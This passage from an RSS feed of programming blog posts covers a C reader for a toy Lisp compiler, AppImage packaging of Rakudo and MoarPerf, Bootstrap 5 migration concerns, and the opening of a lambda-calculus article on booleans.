<code>0</code>, which is how we encode the integer <code>0</code>. On others, it could be defined to
be <code>0x55555555</code><sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> or something equally silly. Regardless, its value might
overlap with our type encoding scheme in some unintended way.</p>

<p>This means that we have to go ahead and add another immediate object: an
<code>Error</code> object. We have some open immediate tag bits, so sure, why not. We can
also use this to signal runtime errors and other fun things. It‚Äôll probably be
useful.</p>

<h3 id="the-error-object">The Error object</h3>

<p>Back to the object tag diagram. Below I have reproduced the tag diagram from
previous posts, but now with a new entry (denoted by <code>&lt;-</code>). This new entry
shows the encoding for the canonical <code>Error</code> object.</p>

<div><div><pre><code>High							     Low
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX00  Integer
0000000000000000000000000000000000000000000000000XXXXXXX00001111  Character
00000000000000000000000000000000000000000000000000000000X0011111  Boolean
0000000000000000000000000000000000000000000000000000000000101111  Nil
0000000000000000000000000000000000000000000000000000000000111111  Error &lt;-
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX001  Pair
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX010  Vector
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX011  String
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX101  Symbol
XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX110  Closure
</code></pre></div></div>

<p>If we wanted to, we could even add additional tag bits to the (currently all 0)
payload, to signal different kinds of errors. Maybe later. For now, we add a
tag constant and associated <code>Object</code> and <code>AST</code> functions:</p>

<div><div><pre><code><span>const</span> <span>unsigned</span> <span>int</span> <span>kErrorTag</span> <span>=</span> <span>0x3f</span><span>;</span> <span>// 0b111111</span>
<span>uword</span> <span>Object_error</span><span>()</span> <span>{</span> <span>return</span> <span>kErrorTag</span><span>;</span> <span>}</span>

<span>bool</span> <span>AST_is_error</span><span>(</span><span>ASTNode</span> <span>*</span><span>node</span><span>)</span> <span>{</span> <span>return</span> <span>(</span><span>uword</span><span>)</span><span>node</span> <span>==</span> <span>Object_error</span><span>();</span> <span>}</span>
<span>ASTNode</span> <span>*</span><span>AST_error</span><span>()</span> <span>{</span> <span>return</span> <span>(</span><span>ASTNode</span> <span>*</span><span>)</span><span>Object_error</span><span>();</span> <span>}</span>
</code></pre></div></div>

<p>That should be enough to get us going for now. Perhaps we could even convert
our <code>Compile_</code> suite of functions to use this object instead of an <code>int</code>. It
would certainly be more informative. Maybe in a future post.</p>

<h3 id="language-syntax">Language syntax</h3>

<p>Let‚Äôs get back to business and think about what we want our language to look
like. This is a Lisp series but really you could adapt your reader to read any
sort of syntax. No need for parentheses if you‚Äôre allergic.</p>

<p>I‚Äôm going to use this simple Lisp reader because it‚Äôs short and simple, so
we‚Äôll have some parens.</p>

<p>First, our integers will look like integers in most languages ‚Äî <code>0</code>, <code>123</code>,
<code>-123</code>.</p>

<p>You can add support for other bases if you like, but I don‚Äôt plan on it here.</p>

<p>Second, our characters will look like C characters ‚Äî <code>'a'</code>, <code>'b'</code>, etc. Some
implementations opt for <code>#'a</code> but that has always looked funky to me.</p>

<p>Third, our booleans will be <code>#t</code> and <code>#f</code>. You‚Äôre also welcome to go ahead and
use symbols to represent the names, avoid special syntax, and have those
symbols evaluate to truthy and falsey values.</p>

<p>Fourth, the nil object will be <code>()</code>. We can also later bind the symbol <code>nil</code> to
mean <code>()</code>, too.</p>

<p>I‚Äôm going to skip error objects, because they don‚Äôt yet have any sort of
user-land meaning yet ‚Äî they‚Äôre just used in compiler infrastructure right
now.</p>

<p>Fifth, pairs will look like <code>(1 2 3)</code>, meaning <code>(cons 1 (cons 2 (cons 3
nil)))</code>. I don‚Äôt plan on adding support for dotted pair syntax. Whitespace will
be insignificant.</p>

<p>Sixth, symbols will look like any old ASCII identifier: <code>hello</code>, <code>world</code>,
<code>fooBar</code>. I‚Äôll also include some punctuation in there, too, so we can use <code>+</code>
and <code>-</code> as symbols, for example. Or we could even go full Lisp and use
<code>train-case</code> identifiers.</p>

<p>I‚Äôm going to skip closures, since they don‚Äôt have a syntactic representation
‚Äî they are just objects known to the runtime. Vectors and strings don‚Äôt have
any implementation right now so we‚Äôll add those to the reader later.</p>

<p>That‚Äôs it! Key points are: mind your plus and minus signs since they can appear
in both integers and symbols; don‚Äôt read off the end; have fun.</p>

<h3 id="the-reader-implementation">The Reader implementation</h3>

<p>Now that we‚Äôve rather informally specified what our language looks like, we can
write a small reader. We‚Äôll start with the <code>Reader_read</code> function from above.</p>

<p>This function will just be a shell around an internal function with some more
parameters.</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>Reader_read</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>)</span> <span>{</span>
  <span>word</span> <span>pos</span> <span>=</span> <span>0</span><span>;</span>
  <span>return</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>&amp;</span><span>pos</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This is because we need to carry around some more state to read through this
string. We need to know how far into the string we are. I chose to use an
additional <code>word</code> for the index. Some might prefer a <code>char**</code> instead. Up to
you.</p>

<p>With any recursive reader invocation, we should advance through all the
whitespace, because it doesn‚Äôt mean anything to us. For this reason, we have a
handy-dandy <code>skip_whitespace</code> function that reads through all the whitespace
and then returns the next non-whitespace character.</p>

<div><div><pre><code><span>void</span> <span>advance</span><span>(</span><span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span> <span>++*</span><span>pos</span><span>;</span> <span>}</span>

<span>char</span> <span>next</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
<span>}</span>

<span>char</span> <span>skip_whitespace</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>for</span> <span>(</span><span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isspace</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>;</span>
  <span>}</span>
  <span>return</span> <span>c</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>We can use <code>skip_whitespace</code> in the <code>read_rec</code> function to fetch the next
non-whitespace character. Then we‚Äôll use that character (and sometimes the
following one, too) to determine what structure we‚Äôre about to read.</p>

<div><div><pre><code><span>bool</span> <span>starts_symbol</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>switch</span> <span>(</span><span>c</span><span>)</span> <span>{</span>
  <span>case</span> <span>'+'</span><span>:</span>
  <span>case</span> <span>'-'</span><span>:</span>
  <span>case</span> <span>'*'</span><span>:</span>
  <span>case</span> <span>'&gt;'</span><span>:</span>
  <span>case</span> <span>'='</span><span>:</span>
  <span>case</span> <span>'?'</span><span>:</span>
    <span>return</span> <span>true</span><span>;</span>
  <span>default:</span>
    <span>return</span> <span>isalpha</span><span>(</span><span>c</span><span>);</span>
  <span>}</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_rec</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>isdigit</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'+'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '+'</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'-'</span> <span>&amp;&amp;</span> <span>isdigit</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]))</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '-'</span>
    <span>return</span> <span>read_integer</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>,</span> <span>/*sign=*/</span><span>-</span><span>1</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>starts_symbol</span><span>(</span><span>c</span><span>))</span> <span>{</span>
    <span>return</span> <span>read_symbol</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '\''</span>
    <span>return</span> <span>read_char</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'t'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 't'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>true</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'#'</span> <span>&amp;&amp;</span> <span>input</span><span>[</span><span>*</span><span>pos</span> <span>+</span> <span>1</span><span>]</span> <span>==</span> <span>'f'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '#'</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip 'f'</span>
    <span>return</span> <span>AST_new_bool</span><span>(</span><span>false</span><span>);</span>
  <span>}</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'('</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span> <span>// skip '('</span>
    <span>return</span> <span>read_list</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>}</span>
  <span>return</span> <span>AST_error</span><span>();</span>
<span>}</span>
</code></pre></div></div>

<p>Note that I put the integer cases above the symbol case because we want to
catch <code>-123</code> as an integer instead of a symbol, and <code>-a123</code> as a symbol instead
of an integer.</p>

<p>We‚Äôll probably add more entries to <code>starts_symbol</code> later, but those should
cover the names we‚Äôve used so far.</p>

<p>For each type of subcase (integer, symbol, list), the basic idea is the same:
while we‚Äôre still inside the subcase, add on to it.</p>

<p>For integers, this means multiplying and adding (concatenating digits, so to
speak):</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_integer</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>,</span> <span>int</span> <span>sign</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>word</span> <span>result</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span> <span>c</span> <span>=</span> <span>next</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>))</span> <span>{</span>
    <span>result</span> <span>*=</span> <span>10</span><span>;</span>
    <span>result</span> <span>+=</span> <span>c</span> <span>-</span> <span>'0'</span><span>;</span>
  <span>}</span>
  <span>return</span> <span>AST_new_integer</span><span>(</span><span>sign</span> <span>*</span> <span>result</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>It also takes a sign parameter so if we see an explicit <code>-</code>, we can negate the
integer.</p>

<p>For symbols, this means reading characters into a C string buffer:</p>

<div><div><pre><code><span>const</span> <span>word</span> <span>ATOM_MAX</span> <span>=</span> <span>32</span><span>;</span>

<span>bool</span> <span>is_symbol_char</span><span>(</span><span>char</span> <span>c</span><span>)</span> <span>{</span>
  <span>return</span> <span>starts_symbol</span><span>(</span><span>c</span><span>)</span> <span>||</span> <span>isdigit</span><span>(</span><span>c</span><span>);</span>
<span>}</span>

<span>ASTNode</span> <span>*</span><span>read_symbol</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>buf</span><span>[</span><span>ATOM_MAX</span> <span>+</span> <span>1</span><span>];</span> <span>// +1 for NUL</span>
  <span>word</span> <span>length</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>(</span><span>length</span> <span>=</span> <span>0</span><span>;</span> <span>length</span> <span>&lt;</span> <span>ATOM_MAX</span> <span>&amp;&amp;</span> <span>is_symbol_char</span><span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]);</span> <span>length</span><span>++</span><span>)</span> <span>{</span>
    <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>}</span>
  <span>buf</span><span>[</span><span>length</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
  <span>return</span> <span>AST_new_symbol</span><span>(</span><span>buf</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>For simplicity‚Äôs sake, I avoided dynamic resizing. We only get at most symbols
of size 32. Oh well.</p>

<p>Note that symbols can also have trailing numbers in them, just not at the front
‚Äî like <code>add1</code>.</p>

<p>For characters, we only have three potential input characters to look at:
quote, char, quote. No need for a loop:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_char</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>input</span><span>[</span><span>*</span><span>pos</span><span>];</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>input</span><span>[</span><span>*</span><span>pos</span><span>]</span> <span>!=</span> <span>'\''</span><span>)</span> <span>{</span>
    <span>return</span> <span>AST_error</span><span>();</span>
  <span>}</span>
  <span>advance</span><span>(</span><span>pos</span><span>);</span>
  <span>return</span> <span>AST_new_char</span><span>(</span><span>c</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>This means that input like <code>''</code> or <code>'aa'</code> will be an error.</p>

<p>For booleans, we can tackle those inline because there‚Äôs only two cases and
they‚Äôre both trivial. Check for <code>#t</code> and <code>#f</code>. Done.</p>

<p>And last, for lists, it means we recursively build up pairs until we get to
<code>nil</code>:</p>

<div><div><pre><code><span>ASTNode</span> <span>*</span><span>read_list</span><span>(</span><span>char</span> <span>*</span><span>input</span><span>,</span> <span>word</span> <span>*</span><span>pos</span><span>)</span> <span>{</span>
  <span>char</span> <span>c</span> <span>=</span> <span>skip_whitespace</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>')'</span><span>)</span> <span>{</span>
    <span>advance</span><span>(</span><span>pos</span><span>);</span>
    <span>return</span> <span>AST_nil</span><span>();</span>
  <span>}</span>
  <span>ASTNode</span> <span>*</span><span>car</span> <span>=</span> <span>read_rec</span><span>(</span><span>input</span><span>,</span> <span>pos</span><span>);</span>
  <span>assert</span><span>(</span><span>car</span> <span>!=</span> <span>AST_error</span><span>());</span>
  <span>ASTNode</span> <span>*</span><span>cdr</span> <span>=</span> <span>read_l‚Ä¶</span></code></pre></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bernsteinbear.com/blog/compiling-a-lisp-6/">https://bernsteinbear.com/blog/compiling-a-lisp-6/</a></em></p>]]>
            </description>
            <link>https://bernsteinbear.com/blog/compiling-a-lisp-6/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580453</guid>
            <pubDate>Thu, 24 Sep 2020 16:35:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can you AppImageine that? ‚Äì Timo Paulssen]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580439">thread link</a>) | @lizmat
<br/>
September 24, 2020 | https://wakelift.de/can-you-appimageine-that/ | <a href="https://web.archive.org/web/*/https://wakelift.de/can-you-appimageine-that/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 300w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w,
                            https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://images.unsplash.com/photo-1543352631-6b884eafab2f?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="Can you AppImageine that?">
            </figure>

            <section>
                <div>
                    <figure><img src="https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ" alt="This old green toolbox wears its age well and hints at owners long past, their workday woes and triumphs‚Äîthe daily grind. " srcset="https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 600w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1000&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1000w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=1600&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 1600w, https://images.unsplash.com/photo-1558906050-d6d6aa390fd3?ixlib=rb-1.2.1&amp;q=80&amp;fm=jpg&amp;crop=entropy&amp;cs=tinysrgb&amp;w=2400&amp;fit=max&amp;ixid=eyJhcHBfaWQiOjExNzczfQ 2400w" sizes="(min-width: 720px) 720px"><figcaption>Photo by <a href="https://unsplash.com/@shs521?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Susan Holt Simpson</a> / <a href="https://unsplash.com/?utm_source=ghost&amp;utm_medium=referral&amp;utm_campaign=api-credit">Unsplash</a></figcaption></figure><p>I have been unsatisfied with the installation process for MoarPerf for a little while now. You have to either compile the javascript (and css) yourself using npm (or equivalent) which takes a little while, or you have to rely on me releasing an "everything built for you" version to my github repo.</p><p>The last few days I've repeatedly bonked my metaphorical pickaxe against the stone wall that is unpleasantly long build times and an endless stream of small mistakes in order to bring you MoarPerf in an AppImage.</p><p>AppImage is a format for linux programs that allows programs to be distributed as a single executable file without a separate install process.</p><p><a href="https://github.com/timo/moarperf/releases">The AppImage for MoarPerf</a> includes a full Rakudo along with the dependencies of MoarPerf, the built javascript, and the Raku code. This way you don't even have to have a working Rakudo installation on the machine you want to use to analyze the profiler results. Yours truly tends to put changes in MoarVM or nqp or Rakudo that sometimes prevent things from working fine, and resetting the three repos back to a clean state and rebuilding can be a bit of an annoyance.</p><p>With the MoarPerf AppImage I don't have to worry about this at all any more! That's pretty nice.</p><h2 id="appimages-for-everyone-">AppImages for Everyone!</h2><p>With an AppImage created for MoarPerf it was not too much work to make <a href="https://github.com/timo/rakudo-appimage/releases">an AppImage for Rakudo</a> without a built-in application.</p><p>The next step is, of course, to pack everything up nicely to create a one-or-two-click solution to build AppImages for any script that you may be interested in running.</p><p>There has also already been a module that <a href="https://github.com/jnthn/p6-app-installermaker-wix">creates a windows installer for a Raku program</a> by installing a custom MoarVM/nqp/Rakudo into a pre-determined path (a limitation from back when Rakudo wasn't relocatable yet), and maybe I should offer an installer like this for windows users, too? The AppImage works much like this, too, except it already makes use of the work that made Rakudo relocatable, so it doesn't need to run in a pre-defined path.</p><p>If you want to give building AppImages a try as well, feel free to <a href="https://github.com/timo/rakudo-appimage">steal everything from the rakudo-appimage repository</a>, and have a look at the <code>.travis.yml</code> and the <code>appimage</code> folder in <a href="https://github.com/timo/moarperf">the moarperf repo</a>!</p><p>In any case, I would love to hear from people, whether the AppImages for Rakudo and MoarPerf work on their machines, and what modules/apps they would like to have in an AppImage. Feel free to message me on twitter, write to the Raku users mailing list, or find me on freenode as <code>timotimo</code>.</p><p>Thanks for reading, stay safe, and see y'all later!</p>
                </div>
            </section>



        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://wakelift.de/can-you-appimageine-that/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580439</guid>
            <pubDate>Thu, 24 Sep 2020 16:34:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Is Bootstrap 5 ready to be used in production?]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580423">thread link</a>) | @volkandkaya
<br/>
September 24, 2020 | https://versoly.com/blog/bootstrap5-production-ready | <a href="https://web.archive.org/web/*/https://versoly.com/blog/bootstrap5-production-ready">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="story">
                    <p>At Versoly we use Bootstrap 4 for our blocks and templates and have seen a bunch of templates already start using Bootstrap 5. I wanted to see if it was worth porting our code from 4 to 5 or should we wait.</p>
<p>First step for us was to see how much work it would require to port over.</p>
<h3>Remove JQuery</h3>
<p>Bootstrap 5 is removing JQuery as a dependency. That is great for page speed, but it also means that lots of plugins will stop working if they require it as well.</p>
<p>Luckily the team at Bootstrap 5 announced a long time ago that they‚Äôre removing it and we have been careful to not include JQuery code or libraries that require it.</p>
<p>It looks like the internals have changed but the external is still the same so that means no need to edit existing HTML to fit.</p>
<h3>Extra Colors</h3>
<div><p>Bootstrap 5 includes a lot more </p><a href="https://v5.getbootstrap.com/docs/5.0/customize/color/#theme-colors"><u>colors</u></a><p>, but they don‚Äôt seem to be easily accessible. You have to add them into the SCSS. Which makes sense for web apps, but for landing page templates not so much.</p><p>

I was hoping that like Tailwind CSS they would include them all. This would make it possible to use class=‚Äùbtn btn-blue-100‚Äù. We try to follow Bootstrap as much as possible so most likely won‚Äôt make this available.</p></div>
<h3>Updated forms</h3>
<p>Most of the form code is the same, however for switches they have changed custom-switch to form-switch which will break our current forms that use a switch.</p>
<h3>Enhanced grid system</h3>
<p>A new grid tier has been added xxl which is for screens larger than 1400px. Lots of our customers use 1920 and 2560 so this will change the design of the website for a lot of them.</p>
<h3>Responsive Font Sizes</h3>
<p><a href="https://github.com/twbs/rfs"><u>RFS</u></a> has been added to Bootstrap 5 which allows fonts to change size depending on screen size. We already implemented this in our Bootstrap 4 code. It makes working with font sizes a lot easier. However if you have fixed designs it will break the design of your website.</p>
<h3>Any breaking changes in GitHub issues?</h3>
<p><strong>V5.0.0-alpha2</strong> has 191 shipped issues, lots of them are just bumping up versions. However there are bug fixes and new features being introduced.</p>
<p><a href="https://github.com/twbs/bootstrap/pull/31280"><u>Extra position utilities</u></a> are being added that will allow ‚Äúposition-absolute top-0‚Äù. This will allow us to clean up some extra CSS we have added for our newer templates.</p>
<p>Also seems to be a bugger with the <a href="https://github.com/twbs/bootstrap/pull/31649"><u>gutters</u></a>. ‚ÄúGrid container, row, and column padding/margin should always match.‚Äù at the moment not all the gutters match. This would add extra support tickets when elements don‚Äôt align.</p>
<p><strong>V5.0.0-alpha3 </strong>has 9 approved changes, 6 in review and 26 in the inbox as of 22nd Sept.</p>
<p>One of the new features is <a href="https://github.com/twbs/bootstrap/pull/30571"><u>font size utility</u></a>, we have already added an extra display 5 and 6 to our Boostrap 4 code. Bootstrap 5 decided to do that as well. With these new utility classes you will be able to change the size based on screen size. Seems to be some conflicts with RFS, so we will need to investigate more if we can use these inside Versoly.</p>
<p>They might also be changing <a href="https://github.com/twbs/bootstrap/issues/29989"><u>rounded-sm</u></a> to something less confusing which would break our Bootstrap 4 blocks and templates. We could easily fix our end by just replacing it with its equivalent for customers who upgrade to Bootstrap 5.</p>
<h3>Worth it?</h3>
<p>Not many changes are required to get Versoly working for Bootstrap 5 alpha1. The biggest issues for us would be the switch inputs and the new grid tier. We could most likely fix the switch issue at our end and notify the customer that the grid system has changed.</p>
<p>However there seems to be some bugs (to be expected in alpha1) and new features coming out.</p>
<p>For us we will wait until at least Bootstrap 5 alpha3 is released and will look at what they have planned for alpha4 or the beta.</p>
<p>If you‚Äôre working on a web app or a single website, it might be worth upgrading now. The website will load faster and if you upgrade with each alpha release you will have less technical debt. You will need to check if there are any bugs you will encounter when upgrading.</p>
                </article></div>]]>
            </description>
            <link>https://versoly.com/blog/bootstrap5-production-ready</link>
            <guid isPermaLink="false">hacker-news-small-sites-24580423</guid>
            <pubDate>Thu, 24 Sep 2020 16:33:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[All you need is Œª, part one: booleans]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24580312">thread link</a>) | @azhenley
<br/>
September 24, 2020 | https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/ | <a href="https://web.archive.org/web/*/https://antitypical.com/posts/2020-03-29-all-you-need-is-lambda-1-booleans/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    


    <div role="main">
      <div>
        

<article>
  <p>Nearly a century ago, Alonzo Church invented the simple, elegant, and yet elusive lambda calculus. Along with Alan Turing, he then proved the Church-Turing thesis: that anything computable with a Turing machine can also be computed in the lambda calculus. However, nearly as soon as we had digital computers, we started inventing programming languages, and with them a vast treasure of features, beautiful and terrible, many of which seem very hard to relate to the fundamental nature of computability, let alone the lambda calculus specifically.</p>
<!--more-->
<p>While it‚Äôs true that anything which can be computed, period, can be computed in the lambda calculus, you might not want to: it‚Äôs austere, to say the least, and was not designed with modern sensibilities regarding readability in mind. We developed all those languages and features for a reason! Still, Church demonstrated not just that it was possible to compute anything computable with the lambda calculus, but also <em>how</em> one might do so.</p>
<p>In this series, we‚Äôll examine some ways to express common programming language features using the minimalistic tools of the lambda calculus. We begin with perhaps the most ubiquitous type: booleans.</p>
<h2 id="Œª-is-blind">Œª is blind</h2>
<p>The lambda calculus‚Äôs austerity is extreme: you don‚Äôt even have booleans. All you have are:</p>
<ol type="1">
<li><p>Lambda abstractions;</p></li>
<li><p>Applications; and</p></li>
<li><p>Variables.</p></li>
</ol>
<p>We‚Äôll now review these in some detail; feel free to skip this section if you‚Äôre already familiar with the lambda calculus.</p>
<h3 id="lambda-abstractions">Lambda abstractions</h3>
<p>Lambda abstractions (‚Äúlambdas,‚Äù ‚Äúabstractions,‚Äù and ‚Äúfunctions‚Äù will also be used interchangeably) introduce a function of a single variable.</p>
<p>Abstractions are written <code>Œª x . y</code>, for variable <code>x</code> and expression <code>y</code>, where <code>x</code> is now available as a bound variable in the body, and any enclosing definition of <code>x</code> is shadowed (i.e.&nbsp;<code>Œª x . Œª x . x</code> = <code>Œª x . Œª y . y</code> ‚â† <code>Œª x . Œª y . x</code>). (We shall assume strictly lexical scoping for the time being.)</p>
<p>In Haskell, we would write <code>\ x -&gt; y</code> instead; in JavaScript, <code>function (x) { return y }</code> or <code>(x) =&gt; y</code>.</p>
<h3 id="applications">Applications</h3>
